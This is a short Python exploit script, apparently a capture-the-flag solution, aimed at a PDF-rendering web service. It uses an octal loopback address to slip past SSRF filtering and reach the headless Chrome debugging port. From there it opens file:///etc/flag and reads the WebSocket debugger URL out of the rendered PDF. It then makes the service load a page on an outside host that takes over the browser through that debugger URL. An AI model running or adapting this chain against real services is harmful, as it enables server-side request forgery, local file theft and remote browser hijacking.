import requests
import sys
import pdfplumber
import json
import re

IP = 'localhost'
PORT = 3334

if len(sys.argv) > 1:
    IP = sys.argv[1]

with open('resp.pdf', 'wb') as f:
    r = requests.post('http://{}:{}/pdf'.format(IP, PORT),
                      data={'url': 'http://0177.0.0.1:9222/json/new?file:///etc/flag'})
    f.write(r.content)

regex = r"webSocketDebuggerUrl\": \"(.*)\""

with pdfplumber.open("resp.pdf") as pdf:
    first_page = pdf.pages[0]
    matches = re.findall(regex, first_page.extract_text())
    r = requests.post('http://{}:{}/pdf'.format(IP, PORT),
                      data={'url': 'http://task.shadowservants.ru:7777/wshack.html#' + matches[0]})

